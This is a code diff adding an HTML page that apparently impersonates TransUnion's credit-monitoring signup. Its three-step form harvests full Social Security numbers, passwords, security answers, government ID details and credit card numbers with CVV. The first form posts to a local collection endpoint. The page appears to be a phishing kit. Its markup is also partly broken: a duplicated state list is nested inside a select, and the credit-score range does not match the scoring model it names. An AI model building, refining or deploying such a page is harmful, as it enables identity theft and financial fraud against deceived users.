@@ -1,0 +1,527 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Credit Scores, Credit Reports & Credit Check | TransUnion</title>
+    <meta name="description" content="TransUnion offers total credit protection all in one place from credit score, credit report and credit alert. Check your credit score today from TransUnion!">
+    
+    <!-- Favicon -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='40' fill='%230066cc'/><text x='50' y='55' text-anchor='middle' fill='white' font-family='Arial' font-size='24' font-weight='bold'>TU</text></svg>">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <a href="#" class="logo">
+                    <div class="logo-icon">TU</div>
+                    TransUnion
+                </a>
+                <div class="header-right">
+                    <div class="secure-indicator">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                        </svg>
+                        <span>Secure Server</span>
+                    </div>
+                    <a href="#" class="header-button">Member Login</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <div class="hero-text">
+                    <div class="hero-badge">Personal</div>
+                    <h1 class="hero-title">Make sure your credit stays right-side-up with TransUnion®</h1>
+                    <p class="hero-subtitle">Life won't be upside-down forever. Get your credit score now and stay on top of it with updates available daily.</p>
+                    <a href="#get-started" class="hero-cta">
+                        <span>Get Started Now</span>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M5 12h14"/>
+                            <path d="M12 5l7 7-7 7"/>
+                        </svg>
+                    </a>
+                </div>
+                <div class="hero-image">
+                    <div class="hero-woman"></div>
+                    <div class="mobile-mockup">
+                        <div class="mobile-screen">
+                            <div class="app-header">Credit Monitoring</div>
+                            <div class="score-circle-mini"></div>
+                            <div style="font-size: 10px; color: #666; margin-bottom: 10px;">My VantageScore® 3.0 credit score</div>
+                            <div style="font-size: 8px; color: #999;">Score updated daily</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Main Content -->
+    <main id="get-started" class="main-content">
+        <div class="container">
+            <!-- Progress Bar -->
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill" style="width: 33.33%;"></div>
+            </div>
+
+            <!-- Step Indicator -->
+            <div class="step-indicator">
+                <div class="steps">
+                    <div class="step active" id="step1">
+                        <div class="step-number">1</div>
+                        <div>Personal Information</div>
+                    </div>
+                    <div class="step" id="step2">
+                        <div class="step-number">2</div>
+                        <div>Create Account</div>
+                    </div>
+                    <div class="step" id="step3">
+                        <div class="step-number">3</div>
+                        <div>Verify Identity</div>
+                    </div>
+                </div>
+            </div>
+
+           <!-- Step 1: Personal Information -->
+<div id="step1Container" class="form-container">
+  <h2 class="form-title">Personal Information</h2>
+  <p class="form-subtitle"><strong>All fields are required</strong> (except where noted).</p>
+
+  <form id="personalInfoForm" action="http://localhost:3000/submit" method="POST">
+    <div class="form-group">
+      <label for="firstName">First Name <span class="required">*</span></label>
+      <input type="text" id="firstName" name="firstName" required>
+    </div>
+
+    <div class="form-group">
+      <label for="middleName">Middle Name (Optional)</label>
+      <input type="text" id="middleName" name="middleName">
+    </div>
+
+    <div class="form-group">
+      <label for="lastName">Last Name <span class="required">*</span></label>
+      <input type="text" id="lastName" name="lastName" required>
+    </div>
+
+    <div class="form-group">
+      <label>Date of Birth (MM/DD/YYYY) <span class="required">*</span></label>
+      <div class="form-row">
+        <input type="text" id="dobMonth" name="dobMonth" placeholder="MM" maxlength="2" required>
+        <input type="text" id="dobDay" name="dobDay" placeholder="DD" maxlength="2" required>
+        <input type="text" id="dobYear" name="dobYear" placeholder="YYYY" maxlength="4" required>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label for="ssn4">Last 4 Digits of SSN <span class="required">*</span></label>
+      <input type="password" id="ssn4" name="ssn4" maxlength="4" required>
+    </div>
+
+    <div class="form-group">
+      <label for="email">Email <span class="required">*</span></label>
+      <input type="email" id="email" name="email" required>
+    </div>
+
+    <div class="form-group">
+      <label for="mobileNumber">Mobile Number <span class="required">*</span></label>
+      <input type="tel" id="mobileNumber" name="mobileNumber" required>
+    </div>
+
+    <div class="form-group">
+      <label for="address">Address <span class="required">*</span></label>
+      <input type="text" id="address" name="address" required>
+    </div>
+
+    <div class="form-group">
+      <label for="city">City <span class="required">*</span></label>
+      <input type="text" id="city" name="city" required>
+    </div>
+
+    <div class="form-group form-row-2">
+      <div>
+        <label for="state">State <span class="required">*</span></label>
+       <select id="state" required>
+                                    <option value="">Select State</option>
+                                    <option value="AL">Alabama</option>
+                                    <option value="AK">Alaska</option>
+                                    <option value="AZ">Arizona</option>
+                                    <option value="AR">Arkansas</option>
+                                    <option value="CA">California</option>
+                                    <option value="CO">Colorado</option>
+                                    <option value="CT">Connecticut</option>
+                                    <option value="DE">Delaware</option>
+                                    <option value="FL">Florida</option>
+                                    <option value="GA">Georgia</option>
+                                    <option value="HI">Hawaii</option>
+                                    <option value="ID">Idaho</option>
+                                    <option value="IL">Illinois</option>
+                                    <option value="IN">Indiana</option>
+                                    <option value="IA">Iowa</option>
+                                    <option value="KS">Kansas</option>
+                                    <option value="KY">Kentucky</option>
+                                    <option value="LA">Louisiana</option>
+                                    <option value="ME">Maine</option>
+                                    <option value="MD">Maryland</option>
+                                    <option value="MA">Massachusetts</option>
+                                    <option value="MI">Michigan</option>
+                                    <option value="MN">Minnesota</option>
+                                    <option value="MS">Mississippi</option>
+                                    <option value="MO">Missouri</option>
+                                    <option value="MT">Montana</option>
+                                    <option value="NE">Nebraska</option>
+                                    <option value="NV">Nevada</option>
+                                    <option value="NH">New Hampshire</option>
+                                    <option value="NJ">New Jersey</option>
+                                    <option value="NM">New Mexico</option>
+                                    <option value="NY">New York</option>
+                                    <option value="NC">North Carolina</option>
+                                    <option value="ND">North Dakota</option>
+                                    <option value="OH">Ohio</option>
+                                    <option value="OK">Oklahoma</option>
+                                    <option value="OR">Oregon</option>
+                                    <option value="PA">Pennsylvania</option>
+                                    <option value="RI">Rhode Island</option>
+                                    <option value="SC">South Carolina</option>
+                                    <option value="SD">South Dakota</option>
+                                    <option value="TN">Tennessee</option>
+                                    <option value="TX">Texas</option>
+                                    <option value="UT">Utah</option>
+                                    <option value="VT">Vermont</option>
+                                    <option value="VA">Virginia</option>
+                                    <option value="WA">Washington</option>
+                                    <option value="WV">West Virginia</option>
+                                    <option value="WI">Wisconsin</option>
+                                    <option value="WY">Wyoming</option>
+                                </select>
+      </div>
+      <div>
+        <label for="zip">ZIP <span class="required">*</span></label>
+        <input type="text" id="zip" name="zip" maxlength="5" required>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label>Have you lived here more than 6 months? <span class="required">*</span></label>
+      <div class="radio-group">
+        <label><input type="radio" id="lived6monthsYes" name="lived6months" value="yes" checked> Yes</label>
+        <label><input type="radio" id="lived6monthsNo" name="lived6months" value="no"> No</label>
+      </div>
+    </div>
+
+    <div class="checkbox-group">
+      <label>
+        <input type="checkbox" id="termsAgreed" name="termsAgreed" required>
+        I agree to the <a href="#">Terms</a> and <a href="#">Privacy</a>.
+      </label>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <button type="submit" class="btn btn-primary" id="step1Btn">
+        <span>I Accept & Continue to Step 2</span>
+      </button>
+    </div>
+  </form>
+</div>
+
+           
+            <div id="step2Container" class="form-container hidden">
+  <h2 class="form-title">Create Your Account</h2>
+  <p class="form-subtitle">Please create a username and password for your TransUnion account.</p>
+
+  <form id="createAccountForm">
+    <div class="form-group">
+      <label for="username">Username <span class="required">*</span></label>
+      <input type="text" id="username" name="username" required>
+      <div class="error-message" id="usernameError">Username is required</div>
+    </div>
+
+    <div class="form-group">
+      <label for="password">Password <span class="required">*</span></label>
+      <input type="password" id="password" name="password" required>
+      <div class="error-message" id="passwordError">Password is required</div>
+    </div>
+
+    <div class="form-group">
+      <label for="confirmPassword">Confirm Password <span class="required">*</span></label>
+      <input type="password" id="confirmPassword" name="confirmPassword" required>
+      <div class="error-message" id="confirmPasswordError">Passwords must match</div>
+    </div>
+
+    <div class="form-group">
+      <label for="securityQuestion">Security Question <span class="required">*</span></label>
+      <select id="securityQuestion" name="securityQuestion" required>
+        <option value="">Select a security question</option>
+        <option value="pet">What was the name of your first pet?</option>
+        <option value="maiden">What is your mother's maiden name?</option>
+        <option value="car">What was the make of your first car?</option>
+        <option value="city">In what city were you born?</option>
+        <option value="school">What elementary school did you attend?</option>
+      </select>
+      <div class="error-message" id="securityQuestionError">Security question is required</div>
+    </div>
+
+    <div class="form-group">
+      <label for="securityAnswer">Security Answer <span class="required">*</span></label>
+      <input type="text" id="securityAnswer" name="securityAnswer" required>
+      <div class="error-message" id="securityAnswerError">Security answer is required</div>
+    </div>
+
+    <div class="checkbox-group">
+      <input type="checkbox" id="marketingConsent" name="marketingConsent">
+      <div class="checkbox-text">
+        <label for="marketingConsent">
+          Please send me important credit education, helpful tips & news about my service, 
+          including personalized and special offers from TransUnion and its partners.
+        </label>
+      </div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <button type="submit" class="btn btn-primary" id="step2Btn">
+        <span>Continue to Step 3</span>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M5 12h14"/>
+          <path d="M12 5l7 7-7 7"/>
+        </svg>
+      </button>
+    </div>
+  </form>
+</div>
+
+
+         <!-- Step 3: Verify Identity -->
+<div id="step3Container" class="form-container hidden">
+  <h2 class="form-title">Verify Your Identity</h2>
+  <p class="form-subtitle">To protect your security and ensure that we provide your information only to you, please provide the following information.</p>
+
+  <form id="verifyIdentityForm">
+    <div class="form-group">
+      <label for="fullSsn">Full Social Security Number <span class="required">*</span></label>
+      <input type="password" id="fullSsn" name="fullSsn" maxlength="9" required style="max-width: 200px;">
+      <div class="error-message" id="fullSsnError">Full SSN is required</div>
+    </div>
+
+    <div class="form-group">
+      <label>Form of Identification <span class="required">*</span></label>
+      <div class="radio-group">
+        <div class="radio-option">
+          <input type="radio" id="driversLicense" name="idType" value="driversLicense" checked>
+          <label for="driversLicense">Driver's License</label>
+        </div>
+        <div class="radio-option">
+          <input type="radio" id="stateId" name="idType" value="stateId">
+          <label for="stateId">State ID Card</label>
+        </div>
+        <div class="radio-option">
+          <input type="radio" id="passport" name="idType" value="passport">
+          <label for="passport">Passport</label>
+        </div>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label for="idNumber">ID Number <span class="required">*</span></label>
+      <input type="text" id="idNumber" name="idNumber" required>
+      <div class="error-message" id="idNumberError">ID number is required</div>
+    </div>
+
+    <div class="form-group" id="idStateGroup">
+      <label for="idState">Issuing State <span class="required">*</span></label>
+      <select id="idState" name="idState" required>
+        <option value="">Select State</option>
+   
+                                    <option value="">Select State</option>
+                                    <option value="AL">Alabama</option>
+                                    <option value="AK">Alaska</option>
+                                    <option value="AZ">Arizona</option>
+                                    <option value="AR">Arkansas</option>
+                                    <option value="CA">California</option>
+                                    <option value="CO">Colorado</option>
+                                    <option value="CT">Connecticut</option>
+                                    <option value="DE">Delaware</option>
+                                    <option value="FL">Florida</option>
+                                    <option value="GA">Georgia</option>
+                                    <option value="HI">Hawaii</option>
+                                    <option value="ID">Idaho</option>
+                                    <option value="IL">Illinois</option>
+                                    <option value="IN">Indiana</option>
+                                    <option value="IA">Iowa</option>
+                                    <option value="KS">Kansas</option>
+                                    <option value="KY">Kentucky</option>
+                                    <option value="LA">Louisiana</option>
+                                    <option value="ME">Maine</option>
+                                    <option value="MD">Maryland</option>
+                                    <option value="MA">Massachusetts</option>
+                                    <option value="MI">Michigan</option>
+                                    <option value="MN">Minnesota</option>
+                                    <option value="MS">Mississippi</option>
+                                    <option value="MO">Missouri</option>
+                                    <option value="MT">Montana</option>
+                                    <option value="NE">Nebraska</option>
+                                    <option value="NV">Nevada</option>
+                                    <option value="NH">New Hampshire</option>
+                                    <option value="NJ">New Jersey</option>
+                                    <option value="NM">New Mexico</option>
+                                    <option value="NY">New York</option>
+                                    <option value="NC">North Carolina</option>
+                                    <option value="ND">North Dakota</option>
+                                    <option value="OH">Ohio</option>
+                                    <option value="OK">Oklahoma</option>
+                                    <option value="OR">Oregon</option>
+                                    <option value="PA">Pennsylvania</option>
+                                    <option value="RI">Rhode Island</option>
+                                    <option value="SC">South Carolina</option>
+                                    <option value="SD">South Dakota</option>
+                                    <option value="TN">Tennessee</option>
+                                    <option value="TX">Texas</option>
+                                    <option value="UT">Utah</option>
+                                    <option value="VT">Vermont</option>
+                                    <option value="VA">Virginia</option>
+                                    <option value="WA">Washington</option>
+                                    <option value="WV">West Virginia</option>
+                                    <option value="WI">Wisconsin</option>
+                                    <option value="WY">Wyoming</option>
+                                </select>
+   
+        <option value="WY">Wyoming</option>
+      </select>
+      <div class="error-message" id="idStateError">Issuing state is required</div>
+    </div>
+
+    <div class="form-group">
+      <label>Expiration Date (MM/YYYY) <span class="required">*</span></label>
+      <div class="form-row" style="grid-template-columns: 1fr 2fr 1fr;">
+        <input type="text" id="idExpMonth" name="idExpMonth" placeholder="MM" maxlength="2" required>
+        <input type="text" id="idExpYear" name="idExpYear" placeholder="YYYY" maxlength="4" required>
+        <div></div>
+      </div>
+      <div class="error-message" id="idExpError">Valid expiration date is required</div>
+    </div>
+
+    <div id="creditCardSection" class="form-group">
+  <label for="ccNumber">Credit Card Number</label>
+  <input type="text" id="ccNumber" name="ccNumber" maxlength="19" placeholder="1234 5678 9012 3456" />
+
+  <label for="ccName">Name on Card</label>
+  <input type="text" id="ccName" name="ccName" placeholder="John Doe" />
+
+  <div class="expiry-cvv">
+    <div class="expiry">
+      <label for="ccExpiry">Expiry (MM/YY)</label>
+      <input type="text" id="ccExpiry" name="ccExpiry" maxlength="5" placeholder="MM/YY" />
+    </div>
+    <div class="cvv">
+      <label for="ccCVV">CVV</label>
+      <input type="text" id="ccCVV" name="ccCVV" maxlength="4" placeholder="123" />
+    </div>
+  </div>
+
+  <div id="creditCardErrors" class="error-message"></div>
+</div>
+
+
+    <div class="checkbox-group">
+      <input type="checkbox" id="identityTerms" name="identityTerms" required>
+      <div class="checkbox-text">
+        <label for="identityTerms">
+          I affirm that the information provided is accurate. I understand that providing false information may constitute fraud and could result in denial of service. <span class="required">*</span>
+        </label>
+      </div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <button type="submit" class="btn btn-primary" id="step3Btn">
+        <span>Complete Registration</span>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+          <polyline points="22 4 12 14.01 9 11.01"/>
+        </svg>
+      </button>
+    </div>
+  </form>
+</div>
+
+
+            <!-- Success Container -->
+            <div id="successContainer" class="success-container">
+                <div class="success-icon">
+                    <svg width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3">
+                        <polyline points="20 6 9 17 4 12"/>
+                    </svg>
+                </div>
+
+                <h2 class="success-title">Registration Complete!</h2>
+                <p class="success-subtitle">Thank you for signing up for TransUnion Credit Monitoring. Your account has been successfully created.</p>
+
+                <div class="score-display">
+                    <h3 style="color: var(--transunion-blue); margin-bottom: 20px; font-size: 24px;">Your Credit Score</h3>
+                    
+                    <div class="score-circle">
+                        <span class="score-number" id="finalScore">--</span>
+                    </div>
+
+                    <div class="score-label" id="scoreCategory">Excellent</div>
+                    <p class="score-date">Your TransUnion VantageScore® 3.0 credit score as of <span id="scoreDate"></span></p>
+
+                    <div class="score-range">
+                        <div class="range-bar">
+                            <div class="range-marker" id="scoreMarker"></div>
+                        </div>
+                        <div class="range-labels">
+                            <span>Poor (30)</span>
+                            <span>Fair (50)</span>
+                            <span>Good (70)</span>
+                            <span>Excellent (100)</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="report-summary">
+                    <div class="summary-card">
+                        <div class="summary-number" id="totalAccounts">5</div>
+                        <div class="summary-label">Total Accounts</div>
+                    </div>
+                    <div class="summary-card">
+                        <div class="summary-number" id="totalInquiries">2</div>
+                        <div class="summary-label">Recent Inquiries</div>
+                    </div>
+                    <div class="summary-card">
+                        <div class="summary-number" id="negativeItems">0</div>
+                        <div class="summary-label">Negative Items</div>
+                    </div>
+                </div>
+
+                <div style="margin-top: 40px;">
+                    <button class="btn btn-secondary" onclick="window.location.reload()">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <polyline points="1 4 1 10 7 10"/>
+                            <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/>
+                        </svg>
+                        Start Over
+                    </button>
+                    <button class="btn btn-primary" style="margin-left: 15px;" onclick="alert('View Full Report feature coming soon!')">
+                        View Full Report
+                    </button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script src="style.js">
+       
+     
+    </script>
+</body>
+</html>
